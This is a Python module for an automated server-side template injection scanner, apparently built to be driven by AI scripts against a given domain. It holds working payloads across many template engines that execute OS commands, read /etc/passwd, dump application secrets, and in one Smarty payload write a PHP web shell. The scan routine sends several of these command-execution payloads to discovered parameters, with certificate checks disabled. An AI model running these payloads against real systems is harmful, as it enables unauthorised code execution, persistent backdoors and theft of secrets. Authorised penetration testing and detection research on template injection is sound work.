"""
Zenith SSTI Scanner Module - Server-Side Template Injection Detection
SSTI = Direct Remote Code Execution (RCE) on the server.

Tests for:
1. Jinja2/Flask (Python) - {{7*7}}, {{config}}, {{''.__class__.__mro__}}
2. Twig (PHP) - {{7*7}}, {{_self.env.registerUndefinedFilterCallback("exec")}}
3. Freemarker (Java) - ${7*7}, <#assign ex="freemarker.template.utility.Execute"?new()>
4. Velocity (Java) - #set($x=7*7)${x}
5. Smarty (PHP) - {7*7}, {php}system('id'){/php}
6. ERB (Ruby) - <%= 7*7 %>
7. Pebble (Java) - {{7*7}}
8. Handlebars/Mustache - {{#with "s" as |string|}}...{{/with}}
9. Polyglot payloads that work across multiple engines

Usage from AI scripts:
    from zenith.modules.ssti_scanner import SSTIScanner
    scanner = SSTIScanner("target.com")
    results = scanner.scan()
"""

import urllib.request
import urllib.parse
import urllib.error
import ssl
import json
import re
import time
import concurrent.futures


class SSTIScanner:
    """Automated Server-Side Template Injection scanner."""

    # SSTI detection payloads - ordered by engine
    PAYLOADS = {
        'polyglot': {
            # Universal detection payloads
            'payloads': [
                ('{{7*7}}', '49'),
                ('${7*7}', '49'),
                ('#{7*7}', '49'),
                ('<%= 7*7 %>', '49'),
                ('{7*7}', '49'),
                ('{{7*\'7\'}}', '7777777'),  # Jinja2 string multiplication
                ('${7*7}', '49'),
                ('#{7*7}', '49'),
            ],
            'engine': 'Unknown (Polyglot)',
        },
        'jinja2': {
            # Python Jinja2/Flask
            'payloads': [
                ('{{7*7}}', '49'),
                ('{{7*\'7\'}}', '7777777'),
                ('{{config}}', 'SECRET_KEY'),
                ('{{config.items()}}', 'SECRET_KEY'),
                ('{{self.__init__.__globals__}}', '__builtins__'),
                ("{{''.__class__.__mro__[1].__subclasses__()}}", 'Popen'),
                ('{{request.application.__self__._get_data_for_json.__globals__}}', 'os'),
                ('{{lipsum.__globals__["os"].popen("id").read()}}', 'uid='),
                ('{{cycler.__init__.__globals__.os.popen("id").read()}}', 'uid='),
            ],
            'engine': 'Jinja2 (Python/Flask)',
        },
        'twig': {
            # PHP Twig
            'payloads': [
                ('{{7*7}}', '49'),
                ('{{7*\'7\'}}', '49'),
                ("{{dump(app)}}", 'AppKernel'),
                ("{{app.request.server.all|join(',')}}", 'DOCUMENT_ROOT'),
                ("{{'/etc/passwd'|file_excerpt(1,30)}}", 'root:'),
            ],
            'engine': 'Twig (PHP)',
        },
        'freemarker': {
            # Java Freemarker
            'payloads': [
                ('${7*7}', '49'),
                ('${7*7}', '49'),
                ('#{7*7}', '49'),
                ("${'freemarker.template.utility.Execute'?new()('id')}", 'uid='),
                ("<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", 'uid='),
            ],
            'engine': 'Freemarker (Java)',
        },
        'velocity': {
            # Java Velocity
            'payloads': [
                ('#set($x=7*7)${x}', '49'),
                ('#set($str=$class.inspect("java.lang.String").type)', 'java'),
                ('#set($rt=$class.inspect("java.lang.Runtime").type.getRuntime())$rt.exec("id")', 'Process'),
            ],
            'engine': 'Velocity (Java)',
        },
        'smarty': {
            # PHP Smarty
            'payloads': [
                ('{7*7}', '49'),
                ('{math equation="7*7"}', '49'),
                ('{system("id")}', 'uid='),
                ('{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[\'cmd\']); ?>",self::clearConfig())}', 'passthru'),
            ],
            'engine': 'Smarty (PHP)',
        },
        'erb': {
            # Ruby ERB
            'payloads': [
                ('<%= 7*7 %>', '49'),
                ('<%= system("id") %>', 'uid='),
                ('<%= `id` %>', 'uid='),
                ('<%= IO.popen("id").readlines() %>', 'uid='),
            ],
            'engine': 'ERB (Ruby)',
        },
        'pebble': {
            # Java Pebble
            'payloads': [
                ('{{7*7}}', '49'),
                ("{% set cmd = 'id' %}{{cmd}}", 'id'),
            ],
            'engine': 'Pebble (Java)',
        },
        'mako': {
            # Python Mako
            'payloads': [
                ('${7*7}', '49'),
                ("<%import os;x=os.popen('id').read()%>${x}", 'uid='),
            ],
            'engine': 'Mako (Python)',
        },
        'handlebars': {
            # Handlebars/Mustache
            'payloads': [
                ('{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').execSync(\'id\');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}', 'uid='),
            ],
            'engine': 'Handlebars (Node.js)',
        },
    }

    # Parameters commonly reflecting user input into templates
    TEMPLATE_PARAMS = [
        'name', 'username', 'user', 'email', 'message', 'msg', 'text',
        'content', 'body', 'title', 'subject', 'comment', 'description',
        'value', 'q', 'query', 'search', 'keyword', 'input', 'data',
        'template', 'tpl', 'page', 'view', 'render', 'format', 'lang',
        'locale', 'greeting', 'preview', 'output', 'result', 'display',
        'label', 'field', 'param', 'arg', 'v', 'val',
    ]

    def __init__(self, target, base_url=None, cookies=None, headers=None, timeout=10):
        self.target = target
        self.base_url = base_url or f"https://{target}"
        self.timeout = timeout
        self.ctx = ssl._create_unverified_context()
        self.findings = []
        self.tested = 0
        self.cookies = cookies or ""
        self.custom_headers = headers or {}

    def _request(self, url, method="GET", data=None):
        """Make HTTP request."""
        try:
            hdrs = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html, application/json, */*',
            }
            hdrs.update(self.custom_headers)
            if self.cookies:
                hdrs['Cookie'] = self.cookies

            if data and isinstance(data, dict):
                data = urllib.parse.urlencode(data).encode()
                hdrs['Content-Type'] = 'application/x-www-form-urlencoded'

            req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
            resp = urllib.request.urlopen(req, context=self.ctx, timeout=self.timeout)
            body = resp.read(200000).decode(errors='ignore')
            return {
                'status': resp.status,
                'body': body,
                'headers': dict(resp.getheaders()),
                'length': len(body),
            }
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read(100000).decode(errors='ignore')
            except:
                pass
            return {'status': e.code, 'body': body, 'headers': {}, 'length': len(body)}
        except Exception as e:
            return {'status': 0, 'body': str(e), 'headers': {}, 'length': 0}

    def _discover_injection_points(self):
        """Discover parameters that reflect input in the response (potential template injection)."""
        injection_points = []
        print(f"  [*] Discovering injection points...")

        # Fetch main page and find forms/links
        resp = self._request(self.base_url)
        if not resp['body']:
            return injection_points

        body = resp['body']

        # Find forms with input fields
        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\']([^"\']*)', body, re.I)
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)', body, re.I)
        textareas = re.findall(r'<textarea[^>]*name=["\']([^"\']+)', body, re.I)

        for action, method in forms:
            if not action:
                action = '/'
            if not action.startswith('/'):
                action = '/' + action
            form_params = inputs + textareas
            for param in form_params:
                injection_points.append({
                    'path': action,
                    'param': param,
                    'method': method.upper() or 'GET',
                })

        # Find links with parameters
        links = re.findall(r'href=["\']([^"\']*\?[^"\']*)["\']', body, re.I)
        for link in links:
            parsed = urllib.parse.urlparse(link)
            params = urllib.parse.parse_qs(parsed.query)
            for param in params:
                path = parsed.path or '/'
                injection_points.append({
                    'path': path,
                    'param': param,
                    'method': 'GET',
                })

        # Add common parameter tests on root
        for param in self.TEMPLATE_PARAMS[:15]:
            injection_points.append({
                'path': '/',
                'param': param,
                'method': 'GET',
            })

        # Check common template-rendering paths
        template_paths = [
            '/render', '/preview', '/template', '/email/preview',
            '/api/render', '/api/template', '/api/preview',
            '/search', '/contact', '/feedback', '/comment',
            '/profile', '/settings', '/api/format',
        ]
        for path in template_paths:
            resp = self._request(f"{self.base_url}{path}")
            if resp['status'] in (200, 400, 405, 500):
                for param in ['template', 'content', 'text', 'name', 'message']:
                    injection_points.append({
                        'path': path,
                        'param': param,
                        'method': 'GET',
                    })
                    injection_points.append({
                        'path': path,
                        'param': param,
                        'method': 'POST',
                    })

        # Deduplicate
        seen = set()
        unique = []
        for point in injection_points:
            key = f"{point['method']}:{point['path']}:{point['param']}"
            if key not in seen:
                seen.add(key)
                unique.append(point)

        return unique

    def _test_reflection(self, path, param, method='GET'):
        """Quick test if a parameter reflects input in the response."""
        canary = 'z3n1th_ssti_7357'
        if method == 'GET':
            url = f"{self.base_url}{path}?{param}={canary}"
            resp = self._request(url)
        else:
            resp = self._request(f"{self.base_url}{path}", method="POST", data={param: canary})
        self.tested += 1
        return canary in resp.get('body', '')

    def _test_payload(self, path, param, payload, expected, method='GET'):
        """Test a single SSTI payload."""
        encoded_payload = urllib.parse.quote(payload)

        if method == 'GET':
            url = f"{self.base_url}{path}?{param}={encoded_payload}"
            resp = self._request(url)
        else:
            resp = self._request(f"{self.base_url}{path}", method="POST", data={param: payload})

        self.tested += 1
        body = resp.get('body', '')

        # Check if expected output is in the response
        if expected.lower() in body.lower():
            # Verify it's not just reflecting the payload itself
            if payload not in body:
                return True, body
            # Check if the RESULT is there (e.g., 49 for 7*7)
            if expected not in payload:
                return True, body

        return False, body

    def _detect_error_ssti(self, path, param, method='GET'):
        """Detect SSTI via error messages when injecting template syntax."""
        error_payloads = [
            ('{{', ['TemplateSyntaxError', 'template', 'unexpected', 'jinja', 'twig']),
            ('${', ['freemarker', 'velocity', 'expression', 'ParseException']),
            ('<%= ', ['erb', 'ruby', 'syntax error', 'SyntaxError']),
            ('{%', ['template', 'tag', 'unknown', 'TemplateSyntax']),
            ('#{', ['expression', 'template', 'parse']),
        ]

        results = []
        for payload, indicators in error_payloads:
            if method == 'GET':
                url = f"{self.base_url}{path}?{param}={urllib.parse.quote(payload)}"
                resp = self._request(url)
            else:
                resp = self._request(f"{self.base_url}{path}", method="POST", data={param: payload})
            self.tested += 1

            body = resp.get('body', '').lower()
            for indicator in indicators:
                if indicator.lower() in body:
                    results.append({
                        'type': 'SSTI_ERROR_LEAK',
                        'severity': 'MEDIUM',
                        'path': path,
                        'param': param,
                        'payload': payload,
                        'indicator': indicator,
                        'detail': f"Template error leaked with '{payload}': {indicator}",
                    })
                    break

        return results

    def scan(self):
        """Run the full SSTI scan."""
        print(f"\n{'='*60}")
        print(f"  SSTI Scanner - {self.target}")
        print(f"{'='*60}")

        all_findings = []

        # Phase 1: Discover injection points
        print(f"\n[Phase 1] Injection Point Discovery")
        injection_points = self._discover_injection_points()
        print(f"  [*] Found {len(injection_points)} potential injection points")

        # Phase 2: Quick reflection test
        print(f"\n[Phase 2] Reflection Testing")
        reflecting_points = []
        for point in injection_points:
            if self._test_reflection(point['path'], point['param'], point['method']):
                reflecting_points.append(point)
                print(f"  [+] Reflecting: {point['method']} {point['path']}?{point['param']}")

        # If no reflection found, test all points anyway (blind SSTI)
        test_points = reflecting_points if reflecting_points else injection_points[:20]
        print(f"  [*] Testing {len(test_points)} points for SSTI")

        # Phase 3: SSTI payload testing
        print(f"\n[Phase 3] SSTI Payload Injection")
        for point in test_points:
            path = point['path']
            param = point['param']
            method = point['method']

            # First: try polyglot detection
            for engine_name in ['polyglot', 'jinja2', 'twig', 'freemarker', 'velocity', 
                               'smarty', 'erb', 'pebble', 'mako']:
                engine_data = self.PAYLOADS.get(engine_name, {})
                payloads = engine_data.get('payloads', [])
                engine_label = engine_data.get('engine', engine_name)

                for payload, expected in payloads[:3]:  # Top 3 payloads per engine
                    is_vuln, response_body = self._test_payload(path, param, payload, expected, method)

                    if is_vuln:
                        severity = 'CRITICAL' if 'uid=' in response_body or 'root:' in response_body else 'HIGH'
                        finding = {
                            'type': 'SSTI',
                            'severity': severity,
                            'engine': engine_label,
                            'path': path,
                            'param': param,
                            'method': method,
                            'payload': payload,
                            'expected': expected,
                            'detail': f"SSTI detected! Engine: {engine_label}, param: {param}, payload: {payload}",
                        }
                        all_findings.append(finding)
                        sev_icon = '🔴' if severity == 'CRITICAL' else '🟠'
                        print(f"  {sev_icon} [{severity}] SSTI in {method} {path}?{param}")
                        print(f"     Engine: {engine_label}")
                        print(f"     Payload: {payload}")

                        # If RCE confirmed, highlight it
                        if severity == 'CRITICAL':
                            print(f"     ⚡ REMOTE CODE EXECUTION CONFIRMED!")
                        break  # Don't test more payloads for this engine if found

            # Also check for error-based SSTI detection
            error_findings = self._detect_error_ssti(path, param, method)
            all_findings.extend(error_findings)

        # Phase 4: Test URL path-based SSTI
        print(f"\n[Phase 4] Path-Based SSTI Testing")
        path_payloads = ['{{7*7}}', '${7*7}', '<%= 7*7 %>']
        for payload in path_payloads:
            encoded = urllib.parse.quote(payload)
            test_paths = [
                f"/{encoded}",
                f"/search/{encoded}",
                f"/user/{encoded}",
                f"/page/{encoded}",
            ]
            for test_path in test_paths:
                resp = self._request(f"{self.base_url}{test_path}")
                self.tested += 1
                if '49' in resp.get('body', '') and payload not in resp.get('body', ''):
                    all_findings.append({
                        'type': 'SSTI_PATH',
                        'severity': 'HIGH',
                        'path': test_path,
                        'payload': payload,
                        'detail': f"Path-based SSTI: {test_path} evaluates template expressions",
                    })
                    print(f"  🟠 Path-based SSTI: {test_path}")

        self.findings = all_findings

        # Report
        print(f"\n{'='*60}")
        print(f"  SSTI SCAN RESULTS")
        print(f"{'='*60}")
        print(f"  Injection points tested: {len(test_points)}")
        print(f"  Requests made: {self.tested}")
        print(f"  Findings: {len(all_findings)}")

        if all_findings:
            critical = [f for f in all_findings if f.get('severity') == 'CRITICAL']
            high = [f for f in all_findings if f.get('severity') == 'HIGH']

            for i, f in enumerate(all_findings, 1):
                sev = f.get('severity', 'INFO')
                sev_icon = '🔴' if sev == 'CRITICAL' else '🟠' if sev == 'HIGH' else '🟡'
                print(f"\n  {sev_icon} [{sev}] Finding #{i}: {f['type']}")
                print(f"     Detail: {f.get('detail', 'N/A')}")
                if f.get('engine'):
                    print(f"     Engine: {f['engine']}")
                if f.get('payload'):
                    print(f"     Payload: {f['payload']}")

            if critical:
                print(f"\n  ⚡ {len(critical)} CRITICAL - Remote Code Execution possible!")
            if high:
                print(f"  🟠 {len(high)} HIGH - Template injection confirmed!")
        else:
            print(f"\n  ✓ No SSTI vulnerabilities detected.")
            print(f"  Note: SSTI may require authenticated testing or specific parameter discovery.")

        return all_findings


# CLI entry point
if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "TARGET_DOMAIN"
    cookies = sys.argv[2] if len(sys.argv) > 2 else ""
    scanner = SSTIScanner(target, cookies=cookies)
    results = scanner.scan()
    if results:
        print(f"\n⚠ TOTAL SSTI FINDINGS: {len(results)}")
        for r in results:
            print(json.dumps(r, indent=2, default=str))
